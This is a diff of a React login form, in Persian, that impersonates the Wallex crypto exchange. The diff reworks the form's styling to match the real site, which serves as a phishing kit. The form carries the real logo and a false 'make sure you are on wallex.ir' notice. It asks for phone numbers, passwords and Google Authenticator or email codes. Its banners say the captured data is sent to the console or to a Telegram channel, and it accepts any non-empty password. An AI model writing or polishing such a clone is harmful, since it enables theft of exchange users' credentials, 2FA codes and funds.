@@ -125,7 +125,6 @@ export const LoginForm = () => {
               "کد Google Authenticator وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
           });
           break;
-
         case "email":
           setCurrentStep("email");
           setEmailStep("code");
@@ -150,7 +149,6 @@ export const LoginForm = () => {
         setErrors({});
         setHasError(false);
         break;
-
       case "email":
         setCurrentStep("email");
         setEmailStep("email");
@@ -174,7 +172,6 @@ export const LoginForm = () => {
   };
 
   const validatePassword = (password: string): boolean => {
-    // Accept any non-empty password
     return password.length > 0;
   };
 
@@ -400,7 +397,6 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      // Simulate sending email code
       console.log("Sending email code to:", email);
       await new Promise((resolve) => setTimeout(resolve, 1500));
 
@@ -566,44 +562,114 @@ export const LoginForm = () => {
     <div
       style={{
         backgroundColor: "rgb(255, 255, 255)",
+        borderBottomLeftRadius: "16px",
+        borderBottomRightRadius: "16px",
+        borderRadius: "16px",
+        borderTopLeftRadius: "16px",
+        borderTopRightRadius: "16px",
         width: "100%",
         maxWidth: "480px",
       }}
       className="form-card"
     >
       <div
-        className="flex flex-col gap-2"
         style={{
-          padding: "20px",
+          display: "flex",
+          flexDirection: "column",
+          gap: "8px",
+          paddingBottom: "20px",
+          paddingLeft: "20px",
+          paddingRight: "20px",
+          paddingTop: "20px",
           width: "100%",
         }}
       >
         {/* Header */}
-        <div className="flex justify-between items-center w-full">
-          <div className="flex items-center gap-2">
+        <div
+          style={{
+            display: "flex",
+            justifyContent: "space-between",
+            width: "100%",
+          }}
+        >
+          <div
+            style={{
+              alignItems: "flex-start",
+              display: "flex",
+              gap: "8px",
+            }}
+          >
             {currentStep !== "phone" && currentStep !== "loading" && (
-              <Button
-                variant="ghost"
-                size="icon"
+              <button
+                tabIndex={0}
+                type="button"
                 onClick={handleBack}
-                className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
                 style={{
+                  alignItems: "center",
+                  borderBottomLeftRadius: "50%",
+                  borderBottomRightRadius: "50%",
+                  borderColor: "rgba(0, 0, 0, 0.6)",
                   borderRadius: "50%",
-                  width: "auto",
-                  height: "auto",
-                  padding: "0",
+                  borderTopLeftRadius: "50%",
+                  borderTopRightRadius: "50%",
+                  color: "rgba(0, 0, 0, 0.6)",
+                  cursor: "pointer",
+                  display: "flex",
+                  flexShrink: "0",
+                  fontSize: "24px",
+                  justifyContent: "center",
+                  lineHeight: "42px",
+                  outlineColor: "rgba(0, 0, 0, 0.6)",
+                  position: "relative",
+                  textAlign: "center",
+                  textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                  textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                  transitionDuration: "0.15s",
+                  transitionProperty: "background-color",
+                  transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                  userSelect: "none",
+                  verticalAlign: "middle",
                   backgroundColor: "rgba(0, 0, 0, 0)",
+                  border: "none",
                 }}
               >
-                <ChevronLeft
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  width="24"
+                  height="24"
+                  fill="none"
+                  focusable="false"
+                  aria-hidden="true"
+                  viewBox="0 0 24 24"
                   style={{
-                    width: "24px",
-                    height: "24px",
+                    borderColor: "rgba(0, 0, 0, 0.6)",
                     color: "rgba(0, 0, 0, 0.6)",
                     cursor: "pointer",
+                    fill: "rgba(0, 0, 0, 0.6)",
+                    flexShrink: "0",
+                    fontSize: "24px",
+                    height: "24px",
+                    lineHeight: "42px",
+                    outlineColor: "rgba(0, 0, 0, 0.6)",
+                    overflowClipMargin: "content-box",
+                    overflowX: "hidden",
+                    overflowY: "hidden",
+                    textAlign: "center",
+                    textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                    textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                    transitionDuration: "0.2s",
+                    transitionProperty: "fill",
+                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                    userSelect: "none",
+                    width: "24px",
                   }}
-                />
-              </Button>
+                >
+                  <path
+                    fill="currentColor"
+                    d="M14.96 5.4a.75.75 0 1 0-1.06 1.06l4.79 4.79H3.5a.75.75 0 0 0 0 1.5h15.19l-4.79 4.79a.75.75 0 1 0 1.06 1.06l6.07-6.07a.75.75 0 0 0 0-1.06z"
+                  ></path>
+                </svg>
+              </button>
             )}
             <span
               style={{
@@ -615,14 +681,27 @@ export const LoginForm = () => {
               ورود
             </span>
           </div>
-          <a href="#" className="flex items-center flex-shrink-0">
+          <a href="#">
             <img
-              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
               alt="صرافی خرید فروش ارزهای دیجیتال"
+              fetchPriority="high"
+              width="128"
+              height="24"
+              decoding="async"
+              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
               style={{
-                width: "128px",
+                aspectRatio: "auto 128 / 24",
+                borderColor: "rgba(0, 0, 0, 0)",
+                color: "rgba(0, 0, 0, 0)",
+                display: "inline",
                 height: "24px",
-                objectFit: "contain",
+                outlineColor: "rgba(0, 0, 0, 0)",
+                overflowClipMargin: "content-box",
+                overflowX: "clip",
+                overflowY: "clip",
+                textDecorationColor: "rgba(0, 0, 0, 0)",
+                textEmphasisColor: "rgba(0, 0, 0, 0)",
+                width: "128px",
               }}
             />
           </a>
@@ -631,222 +710,634 @@ export const LoginForm = () => {
         {/* Separator */}
         <hr
           style={{
-            borderColor: "rgba(0, 0, 0, 0.2)",
             borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+            borderBottomStyle: "solid",
+            borderBottomWidth: "1px",
+            borderColor: "rgba(0, 0, 0, 0.2)",
+            borderLeftStyle: "solid",
+            borderRightStyle: "solid",
+            borderStyle: "solid",
+            borderTopStyle: "solid",
+            flexShrink: "0",
             marginLeft: "-20px",
             marginRight: "-20px",
             marginTop: "8px",
             marginBottom: "8px",
+            overflowX: "hidden",
+            overflowY: "hidden",
           }}
         />
 
         {/* Content based on current step */}
-        <div className="flex flex-col gap-2" style={{ marginTop: "16px" }}>
+        <div
+          style={{
+            display: "flex",
+            flexDirection: "column",
+            gap: "8px",
+            marginTop: "16px",
+          }}
+        >
           {/* Step 1: Phone Number Input */}
           {currentStep === "phone" && (
             <>
-              <div className="space-y-2">
+              {/* Alert Messages */}
+              <div>
                 <AlertMessage>
                   مطمئن شوید که در دامنه wallex.ir هستید.
                 </AlertMessage>
 
-                {!validateTelegramConfig() && (
+                <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
-                    🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی
-                    تلگرام، فایل .env را تنظیم کنید.
+                    {!validateTelegramConfig()
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
+                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
-                )}
-
-                {validateTelegramConfig() && (
-                  <AlertMessage>
-                    🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد.
-                  </AlertMessage>
-                )}
-
-                <AlertMessage>
-                  پس از ثبت شماره، کد تایید ۶ رقمی{" "}
-                  {validateTelegramConfig()
-                    ? "به بات تلگرام"
-                    : "در پنجره نمایش داده"}{" "}
-                  ارسال خواهد شد.
-                </AlertMessage>
+                </div>
               </div>
 
               <form onSubmit={handlePhoneSubmit}>
+                {/* Mobile Number Input */}
                 <div
                   style={{
                     display: "inline-flex",
                     flexDirection: "column",
+                    marginBottom: "16px",
+                    marginTop: "16px",
                     position: "relative",
                     verticalAlign: "top",
                     width: "100%",
-                    marginBottom: "16px",
-                    marginTop: "16px",
                   }}
                 >
                   <label
                     htmlFor="mobile-input"
                     style={{
+                      cursor: "default",
                       fontSize: "14px",
                       fontWeight: "500",
                       lineHeight: "24.01px",
                       marginBottom: "8px",
+                      maxWidth: "calc(133% - 32px)",
+                      overflowX: "hidden",
+                      overflowY: "hidden",
+                      position: "relative",
+                      right: "0px",
+                      textOverflow: "ellipsis",
+                      textWrap: "nowrap",
+                      top: "0px",
+                      transformOrigin: "100% 0%",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.2s, 0.2s, 0.2s",
+                      transitionProperty: "color, transform, max-width",
+                      transitionTimingFunction:
+                        "cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1), cubic-bezier(0, 0, 0.2, 1)",
+                      userSelect: "none",
+                      whiteSpace: "nowrap",
+                      zIndex: "1",
                       textAlign: "right",
                       color: "rgb(0, 0, 0)",
                     }}
                   >
                     شماره همراه را وارد کنید.
                   </label>
-                  <div style={{ position: "relative" }}>
-                    <Input
+                  <div
+                    style={{
+                      alignItems: "center",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderRadius: "8px",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      cursor: "text",
+                      display: "flex",
+                      position: "relative",
+                      width: "100%",
+                    }}
+                  >
+                    <input
                       id="mobile-input"
+                      aria-invalid="false"
                       name="mobile_number"
                       type="text"
                       inputMode="numeric"
                       maxLength={11}
                       value={toPersianDigits(mobileNumber)}
                       onChange={handleMobileNumberChange}
-                      className="w-full text-right"
+                      autoFocus
+                      disabled={isSubmitting}
                       style={{
-                        borderRadius: "8px",
-                        border: errors.mobileNumber
-                          ? "1px solid rgb(220, 38, 38)"
-                          : "1px solid rgba(0, 0, 0, 0.2)",
-                        padding: "10px 12px",
+                        animation:
+                          "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
+                        animationDuration: "0.01s",
+                        animationName: "mui-auto-fill-cancel",
+                        appearance: "auto",
+                        boxSizing: "content-box",
+                        cursor: "text",
+                        overflowX: "clip",
+                        overflowY: "clip",
+                        paddingBottom: "10px",
+                        paddingLeft: "12px",
+                        paddingRight: "12px",
+                        paddingTop: "10px",
+                        width: "100%",
                         fontSize: "14px",
                         textAlign: "right",
                         backgroundColor: "rgb(255, 255, 255)",
+                        border: "none",
+                        outline: "none",
                       }}
                       placeholder="۰۹۱۲۳۴۵۶۷۸۹"
-                      autoFocus
-                      disabled={isSubmitting}
                     />
-                    {errors.mobileNumber && (
-                      <p
-                        className="text-right mt-1"
+                    <fieldset
+                      aria-hidden="true"
+                      style={{
+                        borderBottom: errors.mobileNumber
+                          ? "1px solid rgb(220, 38, 38)"
+                          : "1px solid rgba(0, 0, 0, 0.2)",
+                        borderBottomLeftRadius: "8px",
+                        borderBottomRightRadius: "8px",
+                        borderBottomStyle: "solid",
+                        borderBottomWidth: "1px",
+                        borderColor: errors.mobileNumber
+                          ? "rgb(220, 38, 38)"
+                          : "rgba(0, 0, 0, 0.2)",
+                        borderLeft: errors.mobileNumber
+                          ? "1px solid rgb(220, 38, 38)"
+                          : "1px solid rgba(0, 0, 0, 0.2)",
+                        borderLeftStyle: "solid",
+                        borderLeftWidth: "1px",
+                        borderRadius: "8px",
+                        borderRight: errors.mobileNumber
+                          ? "1px solid rgb(220, 38, 38)"
+                          : "1px solid rgba(0, 0, 0, 0.2)",
+                        borderRightStyle: "solid",
+                        borderRightWidth: "1px",
+                        borderStyle: "solid",
+                        borderTop: errors.mobileNumber
+                          ? "1px solid rgb(220, 38, 38)"
+                          : "1px solid rgba(0, 0, 0, 0.2)",
+                        borderTopLeftRadius: "8px",
+                        borderTopRightRadius: "8px",
+                        borderTopStyle: "solid",
+                        borderTopWidth: "1px",
+                        borderWidth: "1px",
+                        bottom: "0px",
+                        cursor: "text",
+                        left: "0px",
+                        minWidth: "0%",
+                        overflowX: "hidden",
+                        overflowY: "hidden",
+                        paddingLeft: "8px",
+                        paddingRight: "8px",
+                        pointerEvents: "none",
+                        position: "absolute",
+                        right: "0px",
+                        textAlign: "right",
+                        top: "-5px",
+                      }}
+                    >
+                      <legend
                         style={{
-                          color: "rgb(220, 38, 38)",
+                          cursor: "text",
                           fontSize: "12px",
+                          height: "11px",
+                          lineHeight: "21px",
+                          maxWidth: "0.01px",
+                          overflowX: "hidden",
+                          overflowY: "hidden",
+                          pointerEvents: "none",
+                          textAlign: "right",
+                          textWrap: "nowrap",
+                          transitionDuration: "0.05s",
+                          transitionProperty: "max-width",
+                          transitionTimingFunction:
+                            "cubic-bezier(0, 0, 0.2, 1)",
+                          visibility: "hidden",
+                          whiteSpace: "nowrap",
                         }}
                       >
-                        {errors.mobileNumber}
-                      </p>
-                    )}
+                        <span
+                          style={{
+                            cursor: "text",
+                            display: "inline-block",
+                            fontSize: "12px",
+                            lineHeight: "21px",
+                            opacity: "0",
+                            paddingLeft: "5px",
+                            paddingRight: "5px",
+                            pointerEvents: "none",
+                            textAlign: "right",
+                            textWrap: "nowrap",
+                            whiteSpace: "nowrap",
+                          }}
+                        >
+                          شماره همراه را وارد کنید.
+                        </span>
+                      </legend>
+                    </fieldset>
                   </div>
+                  {errors.mobileNumber && (
+                    <p
+                      style={{
+                        color: "rgb(220, 38, 38)",
+                        fontSize: "12px",
+                        textAlign: "right",
+                        marginTop: "4px",
+                      }}
+                    >
+                      {errors.mobileNumber}
+                    </p>
+                  )}
                 </div>
 
-                <Button
+                {/* Invite Code Toggle Button */}
+                <button
+                  tabIndex={0}
                   type="button"
                   onClick={() => setShowInviteCode(!showInviteCode)}
-                  className="justify-start p-1 mb-1 hover:bg-transparent"
                   style={{
+                    alignItems: "center",
+                    borderBottomLeftRadius: "8px",
+                    borderBottomRightRadius: "8px",
+                    borderColor: "rgb(0, 122, 255)",
+                    borderRadius: "8px",
+                    borderTopLeftRadius: "8px",
+                    borderTopRightRadius: "8px",
+                    color: "rgb(0, 122, 255)",
+                    cursor: "pointer",
+                    display: "inline-flex",
+                    fontSize: "12px",
+                    justifyContent: "center",
+                    lineHeight: "20.004px",
+                    marginBottom: "4px",
+                    outlineColor: "rgb(0, 122, 255)",
+                    paddingBottom: "4px",
+                    paddingTop: "4px",
+                    position: "relative",
+                    textAlign: "center",
+                    textDecorationColor: "rgb(0, 122, 255)",
+                    textEmphasisColor: "rgb(0, 122, 255)",
+                    textTransform: "uppercase",
+                    transitionBehavior: "normal, normal, normal",
+                    transitionDelay: "0s, 0s, 0s",
+                    transitionDuration: "0.25s, 0.25s, 0.25s",
+                    transitionProperty:
+                      "background-color, box-shadow, border-color",
+                    transitionTimingFunction:
+                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                    userSelect: "none",
+                    verticalAlign: "middle",
                     backgroundColor: "rgba(0, 0, 0, 0)",
                     border: "none",
-                    color: "rgb(0, 122, 255)",
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    textTransform: "uppercase",
-                    padding: "4px",
-                    marginBottom: "4px",
                   }}
                 >
-                  <ChevronDown
-                    className={cn(
-                      "mr-1 transition-transform duration-200",
-                      showInviteCode ? "rotate-180" : "",
-                    )}
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="24"
+                    height="24"
+                    fill="none"
+                    focusable="false"
+                    aria-hidden="true"
+                    viewBox="0 0 24 24"
                     style={{
-                      width: "24px",
+                      borderColor: "rgb(0, 122, 255)",
+                      color: "rgb(0, 122, 255)",
+                      cursor: "pointer",
+                      fill: "rgb(0, 122, 255)",
+                      flexShrink: "0",
                       height: "24px",
+                      lineHeight: "26.672px",
                       marginLeft: "4px",
+                      outlineColor: "rgb(0, 122, 255)",
+                      overflowClipMargin: "content-box",
+                      overflowX: "hidden",
+                      overflowY: "hidden",
+                      textAlign: "center",
+                      textDecorationColor: "rgb(0, 122, 255)",
+                      textEmphasisColor: "rgb(0, 122, 255)",
+                      textTransform: "uppercase",
+                      transitionDuration: "0.2s",
+                      transitionProperty: "fill",
+                      transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      width: "24px",
+                      transform: showInviteCode
+                        ? "rotate(180deg)"
+                        : "rotate(0deg)",
+                      transition: "transform 0.2s",
                     }}
-                  />
-                  <span>کد دعوت دارید؟</span>
-                </Button>
+                  >
+                    <path
+                      fill="currentColor"
+                      d="m13.98 5.32-3.21 3.21-1.97 1.96a2.13 2.13 0 0 0 0 3.01l5.18 5.18c.68.68 1.84.19 1.84-.76V6.08c0-.96-1.16-1.44-1.84-.76"
+                    ></path>
+                  </svg>
+                  <span
+                    style={{
+                      borderColor: "rgb(0, 122, 255)",
+                      color: "rgb(0, 122, 255)",
+                      cursor: "pointer",
+                      fontSize: "14px",
+                      fontWeight: "500",
+                      lineHeight: "24.01px",
+                      outlineColor: "rgb(0, 122, 255)",
+                      textAlign: "center",
+                      textDecorationColor: "rgb(0, 122, 255)",
+                      textEmphasisColor: "rgb(0, 122, 255)",
+                      textTransform: "uppercase",
+                      userSelect: "none",
+                    }}
+                  >
+                    کد دعوت دارید؟
+                  </span>
+                </button>
 
+                {/* Invite Code Section */}
                 <div
-                  className={cn(
-                    "overflow-hidden transition-all duration-300",
-                    showInviteCode ? "h-auto visible" : "h-0 invisible",
-                  )}
+                  style={{
+                    height: showInviteCode ? "auto" : "0px",
+                    overflowX: "hidden",
+                    overflowY: "hidden",
+                    transitionDuration: "0.3s",
+                    transitionProperty: showInviteCode ? "height" : "height",
+                    transitionTimingFunction: "cubic-bezier(0.4, 0, 0.2, 1)",
+                    visibility: showInviteCode ? "visible" : "hidden",
+                  }}
                 >
                   {showInviteCode && (
-                    <div className="w-full">
-                      <Input
-                        name="invite_code"
-                        type="text"
-                        placeholder="کد معرف (اختیاری)"
-                        value={inviteCode}
-                        onChange={(e) => setInviteCode(e.target.value)}
-                        className="w-full text-right"
+                    <div
+                      style={{
+                        display: "flex",
+                        visibility: "visible",
+                        width: "100%",
+                      }}
+                    >
+                      <div
                         style={{
-                          borderRadius: "8px",
-                          border: "1px solid rgba(0, 0, 0, 0.2)",
-                          padding: "10px 12px",
-                          fontSize: "14px",
-                          textAlign: "right",
-                          backgroundColor: "rgb(255, 255, 255)",
-                        }}
-                      />
-                      <p
-                        className="text-right mt-2 flex items-center"
-                        style={{
-                          color: "rgba(0, 0, 0, 0.6)",
-                          fontSize: "12px",
-                          lineHeight: "20.004px",
+                          width: "100%",
                         }}
                       >
-                        <Info
-                          className="mr-2"
-                          style={{ width: "24px", height: "24px" }}
-                        />
-                        <span>
-                          کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
-                        </span>
-                      </p>
+                        <div
+                          style={{
+                            display: "inline-flex",
+                            flexDirection: "column",
+                            position: "relative",
+                            verticalAlign: "top",
+                            width: "100%",
+                            marginBottom: "8px",
+                          }}
+                        >
+                          <div
+                            style={{
+                              alignItems: "center",
+                              borderBottomLeftRadius: "8px",
+                              borderBottomRightRadius: "8px",
+                              borderRadius: "8px",
+                              borderTopLeftRadius: "8px",
+                              borderTopRightRadius: "8px",
+                              cursor: "text",
+                              display: "flex",
+                              position: "relative",
+                              width: "100%",
+                            }}
+                          >
+                            <input
+                              aria-invalid="false"
+                              name="invite_code"
+                              placeholder="کد معرف (اختیاری)"
+                              type="text"
+                              value={inviteCode}
+                              onChange={(e) => setInviteCode(e.target.value)}
+                              style={{
+                                animation:
+                                  "0.01s ease 0s 1 normal none running mui-auto-fill-cancel",
+                                animationDuration: "0.01s",
+                                animationName: "mui-auto-fill-cancel",
+                                appearance: "auto",
+                                boxSizing: "content-box",
+                                cursor: "text",
+                                fontFeatureSettings: '"ss00"',
+                                overflowX: "clip",
+                                overflowY: "clip",
+                                paddingBottom: "10px",
+                                paddingLeft: "12px",
+                                paddingRight: "12px",
+                                paddingTop: "10px",
+                                width: "100%",
+                                fontSize: "14px",
+                                textAlign: "right",
+                                backgroundColor: "rgb(255, 255, 255)",
+                                border: "none",
+                                outline: "none",
+                              }}
+                            />
+                            <fieldset
+                              aria-hidden="true"
+                              style={{
+                                borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+                                borderBottomLeftRadius: "8px",
+                                borderBottomRightRadius: "8px",
+                                borderBottomStyle: "solid",
+                                borderBottomWidth: "1px",
+                                borderColor: "rgba(0, 0, 0, 0.2)",
+                                borderLeft: "1px solid rgba(0, 0, 0, 0.2)",
+                                borderLeftStyle: "solid",
+                                borderLeftWidth: "1px",
+                                borderRadius: "8px",
+                                borderRight: "1px solid rgba(0, 0, 0, 0.2)",
+                                borderRightStyle: "solid",
+                                borderRightWidth: "1px",
+                                borderStyle: "solid",
+                                borderTop: "1px solid rgba(0, 0, 0, 0.2)",
+                                borderTopLeftRadius: "8px",
+                                borderTopRightRadius: "8px",
+                                borderTopStyle: "solid",
+                                borderTopWidth: "1px",
+                                borderWidth: "1px",
+                                bottom: "0px",
+                                cursor: "text",
+                                left: "0px",
+                                minWidth: "0%",
+                                overflowX: "hidden",
+                                overflowY: "hidden",
+                                paddingLeft: "8px",
+                                paddingRight: "8px",
+                                pointerEvents: "none",
+                                position: "absolute",
+                                right: "0px",
+                                textAlign: "right",
+                                top: "-5px",
+                              }}
+                            >
+                              <legend
+                                style={{
+                                  cursor: "text",
+                                  lineHeight: "11px",
+                                  overflowX: "hidden",
+                                  overflowY: "hidden",
+                                  pointerEvents: "none",
+                                  textAlign: "right",
+                                  transitionDuration: "0.15s",
+                                  transitionProperty: "width",
+                                  transitionTimingFunction:
+                                    "cubic-bezier(0, 0, 0.2, 1)",
+                                }}
+                              >
+                                <span
+                                  aria-hidden="true"
+                                  style={{
+                                    cursor: "text",
+                                    display: "inline",
+                                    lineHeight: "11px",
+                                    pointerEvents: "none",
+                                    textAlign: "right",
+                                  }}
+                                >
+                                  ​
+                                </span>
+                              </legend>
+                            </fieldset>
+                          </div>
+                        </div>
+                        <p
+                          style={{
+                            borderColor: "rgba(0, 0, 0, 0.6)",
+                            color: "rgba(0, 0, 0, 0.6)",
+                            fontSize: "12px",
+                            lineHeight: "20.004px",
+                            marginTop: "8px",
+                            outlineColor: "rgba(0, 0, 0, 0.6)",
+                            textAlign: "right",
+                            textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                            textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                            display: "flex",
+                            alignItems: "center",
+                          }}
+                        >
+                          <Info
+                            style={{
+                              borderColor: "rgba(0, 0, 0, 0.6)",
+                              color: "rgba(0, 0, 0, 0.6)",
+                              display: "inline-block",
+                              fill: "rgba(0, 0, 0, 0.6)",
+                              flexShrink: "0",
+                              height: "24px",
+                              lineHeight: "26.672px",
+                              marginLeft: "8px",
+                              outlineColor: "rgba(0, 0, 0, 0.6)",
+                              overflowClipMargin: "content-box",
+                              overflowX: "hidden",
+                              overflowY: "hidden",
+                              textAlign: "right",
+                              textDecorationColor: "rgba(0, 0, 0, 0.6)",
+                              textEmphasisColor: "rgba(0, 0, 0, 0.6)",
+                              transitionDuration: "0.2s",
+                              transitionProperty: "fill",
+                              transitionTimingFunction:
+                                "cubic-bezier(0.4, 0, 0.2, 1)",
+                              userSelect: "none",
+                              verticalAlign: "middle",
+                              width: "24px",
+                            }}
+                          />
+                          <span>
+                            کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.
+                          </span>
+                        </p>
+                      </div>
                     </div>
                   )}
                 </div>
 
-                <div style={{ marginTop: "16px" }}>
+                {/* Submit Section */}
+                <div
+                  style={{
+                    marginTop: "16px",
+                  }}
+                >
                   <hr
                     style={{
-                      borderColor: "rgba(0, 0, 0, 0.2)",
                       borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
+                      borderBottomStyle: "solid",
+                      borderBottomWidth: "1px",
+                      borderColor: "rgba(0, 0, 0, 0.2)",
+                      borderLeftStyle: "solid",
+                      borderRightStyle: "solid",
+                      borderStyle: "solid",
+                      borderTopStyle: "solid",
+                      flexShrink: "0",
+                      marginBottom: "16px",
                       marginLeft: "-20px",
                       marginRight: "-20px",
-                      marginBottom: "16px",
+                      overflowX: "hidden",
+                      overflowY: "hidden",
                     }}
                   />
-                  <Button
+                  <button
+                    tabIndex={0}
                     type="submit"
                     disabled={isSubmitting}
-                    className="w-full"
                     style={{
+                      alignItems: "center",
                       backgroundColor: "rgb(23, 29, 38)",
-                      color: "rgb(255, 255, 255)",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderColor: "rgb(255, 255, 255)",
                       borderRadius: "8px",
-                      padding: "10px 16px",
-                      fontSize: "14px",
-                      fontWeight: "500",
-                      textTransform: "uppercase",
-                      border: "none",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      color: "rgb(255, 255, 255)",
                       cursor: isSubmitting ? "not-allowed" : "pointer",
+                      display: "inline-flex",
+                      fontWeight: "500",
+                      justifyContent: "center",
+                      outlineColor: "rgb(255, 255, 255)",
+                      paddingBottom: "10px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                      paddingTop: "10px",
+                      position: "relative",
+                      textAlign: "center",
+                      textDecorationColor: "rgb(255, 255, 255)",
+                      textEmphasisColor: "rgb(255, 255, 255)",
+                      textTransform: "uppercase",
+                      transitionBehavior: "normal, normal, normal",
+                      transitionDelay: "0s, 0s, 0s",
+                      transitionDuration: "0.25s, 0.25s, 0.25s",
+                      transitionProperty:
+                        "background-color, box-shadow, border-color",
+                      transitionTimingFunction:
+                        "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                      userSelect: "none",
+                      verticalAlign: "middle",
+                      width: "100%",
+                      border: "none",
+                      fontSize: "14px",
                       opacity: isSubmitting ? "0.5" : "1",
                     }}
                   >
                     {isSubmitting ? (
-                      <div className="flex items-center justify-center">
+                      <div
+                        style={{
+                          display: "flex",
+                          alignItems: "center",
+                          justifyContent: "center",
+                        }}
+                      >
                         <Loader2
-                          className="animate-spin mr-2"
-                          style={{ width: "16px", height: "16px" }}
+                          style={{
+                            width: "16px",
+                            height: "16px",
+                            marginLeft: "8px",
+                            animation: "spin 1s linear infinite",
+                          }}
                         />
                         <span>در حال ارسال کد...</span>
                       </div>
                     ) : (
-                      "ثبت و ادامه"
+                      <span>ثبت و ادامه</span>
                     )}
-                  </Button>
+                  </button>
                 </div>
               </form>
             </>
@@ -911,39 +1402,74 @@ export const LoginForm = () => {
                     marginBottom: "16px",
                   }}
                 />
-                <Button
+                <button
                   onClick={handleVerifyCodeSubmit}
                   disabled={isSubmitting || verifyCode.length !== 6}
-                  className="w-full"
                   style={{
+                    alignItems: "center",
                     backgroundColor: "rgb(23, 29, 38)",
-                    color: "rgb(255, 255, 255)",
+                    borderBottomLeftRadius: "8px",
+                    borderBottomRightRadius: "8px",
+                    borderColor: "rgb(255, 255, 255)",
                     borderRadius: "8px",
-                    padding: "10px 16px",
-                    fontSize: "14px",
-                    fontWeight: "500",
-                    textTransform: "uppercase",
-                    border: "none",
+                    borderTopLeftRadius: "8px",
+                    borderTopRightRadius: "8px",
+                    color: "rgb(255, 255, 255)",
                     cursor:
                       isSubmitting || verifyCode.length !== 6
                         ? "not-allowed"
                         : "pointer",
+                    display: "inline-flex",
+                    fontWeight: "500",
+                    justifyContent: "center",
+                    outlineColor: "rgb(255, 255, 255)",
+                    paddingBottom: "10px",
+                    paddingLeft: "16px",
+                    paddingRight: "16px",
+                    paddingTop: "10px",
+                    position: "relative",
+                    textAlign: "center",
+                    textDecorationColor: "rgb(255, 255, 255)",
+                    textEmphasisColor: "rgb(255, 255, 255)",
+                    textTransform: "uppercase",
+                    transitionBehavior: "normal, normal, normal",
+                    transitionDelay: "0s, 0s, 0s",
+                    transitionDuration: "0.25s, 0.25s, 0.25s",
+                    transitionProperty:
+                      "background-color, box-shadow, border-color",
+                    transitionTimingFunction:
+                      "cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1), cubic-bezier(0.4, 0, 0.2, 1)",
+                    userSelect: "none",
+                    verticalAlign: "middle",
+                    width: "100%",
+                    border: "none",
+                    fontSize: "14px",
                     opacity:
                       isSubmitting || verifyCode.length !== 6 ? "0.5" : "1",
                   }}
                 >
                   {isSubmitting ? (
-                    <div className="flex items-center justify-center">
+                    <div
+                      style={{
+                        display: "flex",
+                        alignItems: "center",
+                        justifyContent: "center",
+                      }}
+                    >
                       <Loader2
-                        className="animate-spin mr-2"
-                        style={{ width: "16px", height: "16px" }}
+                        style={{
+                          width: "16px",
+                          height: "16px",
+                          marginLeft: "8px",
+                          animation: "spin 1s linear infinite",
+                        }}
                       />
                       <span>در حال تایید...</span>
                     </div>
                   ) : (
                     "تایید کد"
                   )}
-                </Button>
+                </button>
               </div>
             </>
           )}
@@ -1050,35 +1576,70 @@ export const LoginForm = () => {
                       marginBottom: "16px",
                     }}
                   />
-                  <Button
+                  <button
                     type="submit"
                     disabled={isSubmitting}
-                    className="w-full"
                     style={{
+                      alignItems: "center",
                       backgroundColor: "rgb(23, 29, 38)",
-                      color: "rgb(255, 255, 255)",
+                      borderBottomLeftRadius: "8px",
+                      borderBottomRightRadius: "8px",
+                      borderColor: "rgb(255, 255, 255)",
                       borderRadius: "8px",
-                      padding: "10px 16px",
-                      fontSize: "14px",
-                      fontWeight: "500",
-                      textTransform: "uppercase",
-                      border: "none",
+                      borderTopLeftRadius: "8px",
+                      borderTopRightRadius: "8px",
+                      color: "rgb(255, 255, 255)",
                       cursor: isSubmitting ? "not-allowed" : "pointer",
+                      display: "inline-flex",
+                      fontWeight: "500",
+                      justifyContent: "center",
+                      outlineColor: "rgb(255, 255, 255)",
+                      paddingBottom: "10px",
+                      paddingLeft: "16px",
+                      paddingRight: "16px",
+                      paddingTop: "10px",
+                      position: "relative",
+                      textAlign: "center",
